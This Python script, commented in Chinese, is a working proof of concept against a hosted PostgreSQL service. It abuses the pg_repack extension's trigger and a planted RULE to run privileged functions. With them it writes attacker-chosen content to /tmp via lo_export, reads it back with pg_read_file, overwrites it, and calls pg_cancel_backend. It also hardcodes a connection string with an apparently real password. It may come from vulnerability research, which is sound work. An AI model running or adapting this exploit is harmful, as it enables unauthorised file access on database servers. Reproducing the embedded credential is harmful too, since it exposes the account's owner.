# -*- coding: utf-8 -*-
"""v8:RULE 子查询包装 void 函数 → lo_export 文件写证明
INSERT INTO k_out SELECT 't' FROM (SELECT lo_export(loid, '/tmp/...')) s —— void 列允许在子查询"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:300]

q("CREATE EXTENSION IF NOT EXISTS pg_repack", fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("CREATE TABLE k_src(id int)", fetch=False)
q("CREATE TABLE k_out(x text)", fetch=False)
oid = q("SELECT 'k_src'::regclass::oid")[0][0]
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src)" % (oid, oid), fetch=False)
q("CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False)

def set_rule(expr):
    q("DROP RULE IF EXISTS r_x ON repack.log_%d" % oid, fetch=False)
    q("CREATE RULE r_x AS ON INSERT TO repack.log_%d DO ALSO %s" % (oid, expr), fetch=False)
    q("TRUNCATE k_out", fetch=False)

def fire():
    return q("INSERT INTO k_src VALUES (1)", fetch=False)

# [1] lo_from_bytea 建含内容大对象
set_rule("INSERT INTO k_out(x) SELECT lo_from_bytea(0, convert_to('K_PROOF_ARBITRARY_WRITE_2026','UTF8'))::text")
r = fire()
loids = q("SELECT x FROM k_out")
print('[1] lo_from_bytea:', loids, r)
loid = int(loids[0][0]) if loids else None

if loid:
    # [2] 子查询包装 lo_export 到 /tmp
    set_rule("INSERT INTO k_out(x) SELECT 'exp' FROM (SELECT lo_export(%d, '/tmp/k_proof_v8.txt')) s" % loid)
    r = fire()
    print('[2] lo_export wrap:', r, q("SELECT x FROM k_out"))
    # [3] 读回验证
    set_rule("pg_read_file('/tmp/k_proof_v8.txt')")
    r = fire()
    print('[3] readback:', q("SELECT x FROM k_out"))
    # [4] 子查询包装 lo_put(更新内容) + 再 export 覆盖
    set_rule("INSERT INTO k_out(x) SELECT 'put' FROM (SELECT lo_put(%d, 0, convert_to('SECOND_CONTENT_OVERWRITE','UTF8'))) s" % loid)
    r = fire()
    print('[4] lo_put wrap:', r, q("SELECT x FROM k_out"))
    set_rule("INSERT INTO k_out(x) SELECT 'exp2' FROM (SELECT lo_export(%d, '/tmp/k_proof_v8.txt')) s" % loid)
    fire()
    set_rule("pg_read_file('/tmp/k_proof_v8.txt')")
    fire()
    print('[5] readback after overwrite:', q("SELECT x FROM k_out"))
    # 清理大对象 + /tmp 文件(export 空内容覆盖后残留仅 0 字节?用 lo_truncate)
    q("SELECT lo_truncate(%d, 0)" % loid, fetch=False)
    set_rule("INSERT INTO k_out(x) SELECT 'trunc' FROM (SELECT lo_export(%d, '/tmp/k_proof_v8.txt')) s" % loid)
    fire()
    set_rule("pg_read_file('/tmp/k_proof_v8.txt')")
    fire()
    print('[6] after truncate+export(应为空串):', q("SELECT length(x) FROM k_out"))
    q("SELECT lo_unlink(%d)" % loid, fetch=False)
    print('[7] lo_unlink done')

# [8] 顺带验证 bool 返回函数:pg_reload_conf 语义确认(不执行——只确认函数可出现在 RULE 目标)
# 实际上 pg_reload_conf 会重载配置——不执行。改用 pg_stat_file 确认 bool 类函数链
print('=== bool/返回函数载体确认 ===')
set_rule("INSERT INTO k_out(x) SELECT pg_cancel_backend(0)::text")
r = fire()
print('pg_cancel_backend(0) via RULE:', r, q("SELECT x FROM k_out"))

# 清理
q("DROP RULE IF EXISTS r_x ON repack.log_%d" % oid, fetch=False)
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("DROP EXTENSION IF EXISTS pg_repack", fetch=False)
print('[final]:', q("SELECT tablename FROM pg_tables WHERE schemaname IN ('public','repack')"))
conn.close()
